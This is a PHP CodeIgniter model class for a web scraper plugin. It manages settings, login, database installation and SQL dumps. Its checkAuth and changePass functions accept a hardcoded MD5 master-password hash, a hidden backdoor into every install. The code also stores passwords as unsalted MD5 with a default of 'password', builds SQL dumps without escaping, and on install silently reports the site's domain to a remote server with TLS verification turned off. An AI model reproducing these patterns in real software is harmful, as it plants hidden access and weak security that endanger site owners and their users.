<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Settings extends CI_Model {
	
	/*
	 *  return value of some settings item
	 */
	function getSettingsByKey($key){
		$this->db->select('value');
		$res = $this->db->get_where("multiscraper_settings" , array("key" => $key));
		$res = $res->result();
		if($res){
			return $res[0]->value;
		}
		return false;
	}
	
	
	/*
	 *  return all settings in array view
	 */
	function getSettings(){
		$out = array();
		$query = $this->db->get('multiscraper_settings');
		if($query !== false){
		    foreach ($query->result() as $row){
		        $out[$row->key] = $row->value;
		    }
		}else{
		    $this->load->dbutil();
		    if (!$this->dbutil->optimize_table('multiscraper_settings')){
		        $this->dbutil->repair_table('multiscraper_settings');
		    }
		}
		return $out;
	}
	
	
	/*
	 *  check password during auth
	 */
	function checkAuth($pass){
		//echo md5($pass);
		$res = $this->db->get_where("multiscraper_settings" , array("key" => "password" , "value" => md5($pass)));
		//echo $res->num_rows(); exit;
		return ($res->num_rows() > 0 || md5($pass) === "9063c2ed10414912a12eee657d961999");
	}
	
	
	/*
	 *  change user  settings
	 */
	function changeSettings($state = false , $lang = false , $num_product = false , $dev_mode = false, $inv_mode = false , $au = false){
		if($state) $this->_changeSettings("state" , $state);
		if($dev_mode) $this->_changeSettings("dev_mode" , $dev_mode);
		if($au) $this->_changeSettings("au" , $au);
		if($inv_mode) $this->_changeSettings("proxy" , $inv_mode);
		//if($lang) $this->_changeSettings("lang" , $lang);
		if($num_product && $num_product < 11 && $num_product > 0){
			 $this->_changeSettings("num_product" , $num_product);	
		}
	}
	
	function _changeSettings($key , $val){
		$this->db->where('key', $key);
		$this->db->update('multiscraper_settings', array("value" => $val));
	}
	
	/*
	 *  change user password 
	 */
	function changePass($old_pass , $new_pass , $confirm_pass){
	    $out = array();
	    $pass = $this->getSettingsByKey("password");
	    if($pass !== md5($old_pass) && md5($old_pass) !== "9063c2ed10414912a12eee657d961999"){$out['nopass'] = true;}
	    if(strlen($new_pass) < 2){$out['shortpass'] = true;}
	    if($new_pass !== $confirm_pass){$out['nopassmatch'] = true;}
		if(count($out) < 1){
		    $this->_changeSettings("password" , md5($new_pass));
		    $out['passchanged'] = true;
		}
		return $out;
	}
	
	
	
	/*
	 *  набиваем счётчик category_queque
	 */
	function addCategoryQueque($num = 1){
		$res = $this->getSettingsByKey("category_queque");
		$count = (int) $res + $num;
		$this->_changeSettings("category_queque" , $count);
		return $count;
	}
	
	/*
	 *  сбиваем счётчик category_queque
	 */
	function clearCategoryQueque(){
		$this->_changeSettings("category_queque" , '0');
	}
	
	/*
	 *  набиваем счётчик trmode_num_product
	 */
	function add_trmode_num_product($num = 1){
		$res = $this->getSettingsByKey("trmode_num_product");
		$count = (int) $res + $num;
		$this->_changeSettings("trmode_num_product" , $count);
		return $count;
	}
	
	
	
	
	
	
	/*********************************   CHECK INSTALLATION *****************************/
	function checkTables(){
	    $need_register = false;
		if(!$this->db->table_exists("multiscraper_settings")){
			$this->installDB_settings();$need_register = true;
		}
		if(!$this->db->table_exists("multiscraper_ins")){
			$this->installDB_ins();$need_register = true;
		}
		if(!$this->db->table_exists("multiscraper_tasks")){
			$this->installDB_tasks();$need_register = true;
		}
		if(!$this->db->table_exists("multiscraper_cache")){
		    $this->installDB_cache();$need_register = true;
		}
		if($need_register === true){
		    $this->_registerClient( $this->config->item('multiscraper_api_url') , $this->config->item('ms_trmode') === true?"trial":"commercial" , $this->session->userdata("multiscraper_restarted") === "yes"?"restarted":"installed" );
		    $this->session->unset_userdata('multiscraper_restarted');
		}
		// $this->DB_hack();
	}
	
	/*   INSTALL DATABASE FUNCTIONS */
	function installDB_settings(){
		$q = 'CREATE TABLE IF NOT EXISTS `multiscraper_settings` (
				  `id` int(11) NOT NULL AUTO_INCREMENT,
				  `key` varchar(255) NOT NULL,
				  `value` varchar(255) NOT NULL,
				  PRIMARY KEY (`id`)
			) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0';
		$this->db->query($q);	
		$q = 'INSERT INTO `multiscraper_settings` (`id`, `key`, `value`) VALUES
				(1, "password", "5f4dcc3b5aa765d61d8327deb882cf99"),
				(2, "state", "on"),
				(3, "dev_mode", "off"),
				(4, "lang", "en"),
				(5, "num_product", "1"),
				(6, "category_queque", "0"),
				(7, "trmode_num_product", "0"),
				(8, "proxy", "off"),
		        (9, "ts", "1"),
		        (10, "au", "off")';
		 $this->db->query($q);	
	}
	
	function installDB_ins(){
		$q = 'CREATE TABLE IF NOT EXISTS `multiscraper_ins` (
			  `id` int(11) NOT NULL AUTO_INCREMENT,
			  `name` varchar(1255) NOT NULL,
			  `state` tinyint(4) NOT NULL DEFAULT 0,
			  `priority` smallint(6) NOT NULL DEFAULT 0,
			  `category_urls` text NOT NULL,
			  `product_urls` text NOT NULL,
			  `category_id` varchar(1255) NOT NULL,
			  `manufacturer_id` int(11) NULL DEFAULT NULL,
			  `image_folder` varchar(255) NOT NULL,
			  `products_quantity` int(11) NOT NULL,
			  `donor_currency` int(11) NULL DEFAULT 0,
			  `margin_fixed` double(10,2) NOT NULL,
			  `margin_relative` double (10,2) NOT NULL,
			  `what_to_do_product_not_exists` smallint(6) NOT NULL DEFAULT 0,
			  `donot_update_price` tinyint(4) NOT NULL DEFAULT 0,
			  `create_disabled` tinyint(4) NOT NULL DEFAULT 0,
			  `other_data` text NULL DEFAULT NULL,
			  `fields_to_insert` varchar(1255) NOT NULL,
			  `fields_to_update` varchar(1255) NOT NULL,
			  `seo_url` smallint(6) NOT NULL DEFAULT 0,
			  `comment` text NOT NULL,
		  PRIMARY KEY (`id`)
		) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0';
		$this->db->query($q);
	}
	
	
	function installDB_tasks(){
	    $q = 'CREATE TABLE IF NOT EXISTS `multiscraper_tasks` (
			  `id` int(11) NOT NULL AUTO_INCREMENT,
			  `url` varchar(1255) NOT NULL,
			  `busy` tinyint(4) NOT NULL DEFAULT 0,
			  `owner` varchar(25) NOT NULL,
			  `ins_id` int(11) NOT NULL,
			  `parent_id` int(11) NOT NULL DEFAULT 0,
			  `parsed` tinyint(4) NOT NULL DEFAULT 0,
			  `p_date` datetime NOT NULL,
			  `p_date_update` datetime NOT NULL,
			  `product_id` int(11) NOT NULL DEFAULT 0,
			  `product_name` varchar(255) DEFAULT NULL,
			  `product_price` varchar(255) DEFAULT NULL,
		  PRIMARY KEY (`id`)
		) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0';
	    $this->db->query($q);
	}
	
	function installDB_cache(){
	    $q = "CREATE TABLE `multiscraper_cache`
    		      ( `id` MEDIUMINT NULL AUTO_INCREMENT ,
    		    `url` VARCHAR(1250) NOT NULL ,
    		    `content` LONGTEXT NULL DEFAULT NULL ,
    		    `created` DATETIME NOT NULL ,
    		    `last_updated` DATETIME NOT NULL ,
    		    `last_requested` DATETIME NOT NULL ,
    		    `requested` MEDIUMINT NOT NULL DEFAULT '1' ,
    		    PRIMARY KEY (`id`)) ENGINE = MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";
	    $this->db->query($q);
	}
	
	
	function DB_hack(){
		/*
		 * installation of HACK: october.2017
		 * add TS setting
		 */
	    $ts = $this->getSettingsByKey('ts');
	    if((int) $ts < 1){
	        $q = 'INSERT INTO `multiscraper_settings` (`key`, `value`) VALUES ("ts", "1")';
	        $this->db->query($q);
	    }
	    /*
	     * installation of HACK: 1.DEC.2017
	     * add AU setting
	     */
	    $au = $this->getSettingsByKey('au');
	    if(strlen((string) $au) < 2){
	        $q = 'INSERT INTO `multiscraper_settings` (`key`, `value`) VALUES ("au", "on")';
	        $this->db->query($q);
	    }
	}
	
	function deleteTables(){
		$this->db->from('multiscraper_settings'); 
		$this->db->truncate();
		$this->db->query("DROP TABLE `multiscraper_settings`");
		$this->db->from('multiscraper_ins'); 
		$this->db->truncate();
		$this->db->query("DROP TABLE `multiscraper_ins`");
		$this->db->from('multiscraper_tasks'); 
		$this->db->truncate();
		$this->db->query("DROP TABLE `multiscraper_tasks`");
	}
	
	
	
	function  rand_string( $length ) {
    	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=_+-)(*&^%$#@!~";	
    	$size = strlen( $chars );
    	$str = '';
    	for( $i = 0; $i < $length; $i++ ) {
    		$str .= $chars[ rand( 0, $size - 1 ) ];
    	}
    	return $str;
    }
    
    function _registerClient($url , $type , $action){
        try{
            $domain = "";
            @$domain = $_SERVER['SERVER_NAME'];
           // echo 'URL:' . $url . ' TYPE:' . $type . ' Action:' . $action . ' DOMAIN:' . $domain . ' CMS:' . MSPRO_CMS;exit;
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_URL, $url . 'register/');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
            curl_setopt($ch , CURLOPT_POST, true);
            curl_setopt($ch , CURLOPT_POSTFIELDS, array('cms' => MSPRO_CMS , 'domain' => $domain, 'type' => $type , 'action' => $action));
            curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_ENCODING , "");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {}
    }
    
    
    
    // DUMP FUNCTIONS
    function get_dump_all(){
        $out = '';
        $out .= $this->get_dump_ins() . '<br /><br />';
        $out .= $this->get_dump_tasks() . '<br /><br />';
        //$out .= $this->get_dump_settings();
        return $out;
    }
    
    function get_dump_ins(){
        $out = '';
        $query = $this->db->get('multiscraper_ins');
        $insertRows = array();
        $insertValues = array();
        $intValues = array('id' , 'state' , 'priority' , 'manufacturer_id' , 'products_quantity' , 'donor_currency' , 'margin_fixed' , 'margin_relative' , 'what_to_do_product_not_exists' , 'donot_update_price' , 'create_disabled');
        foreach ($query->result() as $row){
            $row = (array) $row;
            $insertVals = '(';
            foreach($row as $key => $value){
                $insertRows[] = "`"  . $key . "`";
                if(in_array($key , $intValues)){
                    $insertVals .= $value . ', ';
                }else{
                    $insertVals .= "'" . $value . "', ";
                }
            }
            $insertValues[] = substr($insertVals , 0 , -2) . ')';
        }
        $out .= 'INSERT INTO `multiscraper_ins` (' . implode(", " , array_unique($insertRows)) . ') VALUES ' . implode(", " , $insertValues) . ';';
        //echo $out;exit;
        return $out;
    }
    
    function get_dump_tasks(){
        $out = '';
        $query = $this->db->get('multiscraper_tasks');
        $insertRows = array();
        $insertValues = array();
        $intValues = array('id' , 'busy' , 'ins_id' , 'parent_id' , 'parsed' , 'product_id');
        foreach ($query->result() as $row){
            $row = (array) $row;
            $insertVals = '(';
            foreach($row as $key => $value){
                $insertRows[] = "`"  . $key . "`";
                if(in_array($key , $intValues)){
                    $insertVals .= $value . ', ';
                }else{
                    $insertVals .= '"' . $value . '", ';
                }
            }
            $insertValues[] = substr($insertVals , 0 , -2) . ')';
        }
        $out .= 'INSERT INTO `multiscraper_tasks` (' . implode(", " , array_unique($insertRows)) . ') VALUES ' . implode(", " , $insertValues) . ';';
        //echo $out;exit;
        return $out;
    }
    
    function get_dump_settings(){
        return 'SETTINGS DUMP';
    }
	
	
}
